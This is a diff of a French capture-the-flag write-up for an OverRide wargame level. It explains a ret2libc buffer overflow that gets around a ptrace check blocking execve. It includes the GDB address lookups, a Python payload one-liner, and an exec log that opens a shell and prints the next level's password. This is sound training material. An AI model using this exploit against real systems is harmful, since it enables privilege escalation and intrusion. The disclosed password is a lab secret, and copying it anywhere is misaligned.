@@ -1,6 +1,3 @@
-env nop 0xffffdc4d
-ret 0x08048825
-
 # level03: RET2LIBC
 
 ### Première étape — tester le programme
@@ -17,6 +14,7 @@ Rien de tres interessant pour rien changer
 
 > _**REMARQUE:**_ Child is exiting ... ? Cette phrase est interessante le programme doit utiliser des forks. Voyons sa de plus pres !
 
+---
 ### Ouvrir GDB
 
 <details>
@@ -104,9 +102,50 @@ Rien de tres interessant pour rien changer
 
 > _**REMARQUE:**_ Nous pouvons voir la fonction `gets` qui est utiliser par les childs du programme !
 
+---
+### ASEMBLY TO C
+
+*Clique [**ICI**](./Ressources/main.c) si tu veux voir tous le code en **C***
+
+---
+### RET2LIBC
+
+##### Qu'est ce que c'est que le **RET2LIBC** ?
+
+Le ret2libc est une methode de la stackoverflow dans le bloc RET du programme pour executer des functions de la libc charger dans le programme.
+
+##### Pourquoi utiliser le **RET2LIBC** aulieu du **RET2RET** ?
+
+Lors des precedents level nous avons toujours opter pour un ret2ret to nopsled car monter le payload est plus simple a faire. Dans ce cas la nous avons un probleme qui nous empeche d'opter pour cette methode qui est le fonction `PTRACE_PEEKUSER` du parents.
+
+##### Pourquoi **PTRACE_PEEKUSER** pose probleme ici ?
+```c
+................
+syscall_num = ptrace(PTRACE_PEEKUSER, pid, OFFSET_EAX, 0);
+
+if (syscall_num == SYSCALL_EXECVE) {
+	puts("no exec() for you");
+	// Tuer le process enfant si il utilise execve
+	kill(pid, SIGKILL);
+	break;
+}
+...............
+```
+Cette verification de `PTRACE_PEEKUSER` empeche l'enfant de vivre si celui ci appel le syscall (0xB) de la fonctions `execve` (*le plus utiliser pour ouvrir des shells dans les shellcodes*).
+
+> _**REMARQUES:**_ *PTRACE_PEEKUSER* utilise OFFSET_EAX qui vaut dans un define a `4 * 11` pour accéder au registre EAX, qui contient le numéro du syscall en cours en 32 bits.
+
+| Registre | Index | Taille | Offset | mémoire |
+|:---------|:-----:|:------:|:------:|:--------|
+EAX        |11     |4 octets|4 * 11  |= 44
+ECX	       |12     |4 octets|4 * 12  |= 48
+EIP	       |14	   |4 octets|4 * 14  |= 56
+ESP	       |15	   |4 octets|4 * 15  |= 60
+
+---
 ### OFFSET
 
-==Pour trouver l'OFFSET nous avons besoin de suivre les childs dans gdb==
+_Pour trouver l'OFFSET nous avons besoin de suivre les childs dans gdb_
 
 ```bash
 (gdb) set follow-fork-mode child
@@ -122,5 +161,99 @@ Program received signal SIGSEGV, Segmentation fault.
 ```
 
 - Notre OFFSET demarre a **156**
+---
+### PAYLOAD
 
-### RET2LIBC
+##### Recherche des fonctions libc du binaire
+
+Pour faire notre payload nous avons besoin de de piocher des fonctions de la libc qui peuvent nous etre utile pour ce dernier.
+
+```bash
+(gdb) info functions system
+All functions matching regular expression "system":
+
+Non-debugging symbols:
+0xf7e6aed0  __libc_system
+0xf7e6aed0  system
+0xf7f48a50  svcerr_systemerr
+```
+Ok nous avons la fonction system charger de la libc, cette fonction est interessante car system appel bien execve mais dans un fork donc en soit nous pouvons bypass le syscall car celui ci n'est pas dans le meme proc que celui surveiller par `PTRACE_PEEKUSER`.
+
+Il nous reste plus qu'a trouver l'arguments de system dans la libc directement l'ideal serrait `"/bin/sh"`
+
+```bash
+(gdb) info proc map
+process 2020
+Mapped address spaces:
+
+	Start Addr   End Addr       Size     Offset objfile
+	 0x8048000  0x8049000     0x1000        0x0 /home/users/level04/level04
+	 0x8049000  0x804a000     0x1000        0x0 /home/users/level04/level04
+	 0x804a000  0x804b000     0x1000     0x1000 /home/users/level04/level04
+	0xf7e2b000 0xf7e2c000     0x1000        0x0 
+	0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
+	0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
+	0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
+	0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
+	0xf7fd0000 0xf7fd4000     0x4000        0x0 
+	0xf7fda000 0xf7fdb000     0x1000        0x0 
+	0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
+	0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.15.so
+	0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
+	0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
+	0xfffdd000 0xffffe000    0x21000        0x0 [stack]
+
+(gdb) find 0xf7e2c000,0xf7fcc000, "/bin/sh"
+0xf7f897ec
+1 pattern found.
+(gdb) x/s 0xf7f897ec
+0xf7f897ec:	 "/bin/sh"
+```
+
+Bingo l'adresse ou ce trouve la string `/bin/sh` ce trouve a l'adresse `0xf7f897ec` 🤝
+
+Il nous faut une adresse de retour maintenant nous pouvons prendre par exemple exit.
+
+```bash
+(gdb) info function exit
+All functions matching regular expression "exit":
+
+Non-debugging symbols:
+0xf7e5eb70  exit # bingo
+0xf7e5eba0  on_exit
+0xf7e5edb0  __cxa_atexit
+0xf7e5ef50  quick_exit
+0xf7e5ef80  __cxa_at_quick_exit
+0xf7ee45c4  _exit
+0xf7f27ec0  pthread_exit
+0xf7f2d4f0  __cyg_profile_func_exit
+0xf7f4bc30  svc_exit
+0xf7f55d80  atexit
+```
+
+##### construction du payload
+- padding`[156]` overflow la stack pour atteindre et remplir eip (ret)
+- EIP → system()`[0xf7e6aed0]`
+- esp + 0x00  → exit()`[0xf7ee45c4]` *(utilisé comme adresse de retour)*
+- esp + 0x04 → /bin/sh`[0xf7f897ec]` *(utilisé comme argument pour system)*
+
+
+```bash
+python -c 'print b"A"*156 + b"\xf7\xe6\xae\xd0"[::-1] + b"\xf7\xee\x45\xc4"[::-1] + b"\xf7\xf8\x97\xec"[::-1]' > /tmp/payload
+```
+
+Essayons le !
+
+---
+
+### EXEC
+
+```bash
+level04@OverRide:~$ cat /tmp/payload - | ./level04 Give me some shellcode, k
+whoami 
+level05
+cat /home/users/level05/.pass
+3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
+```
+
+**CONGRATULATIONS — you owned it ! 🎉**
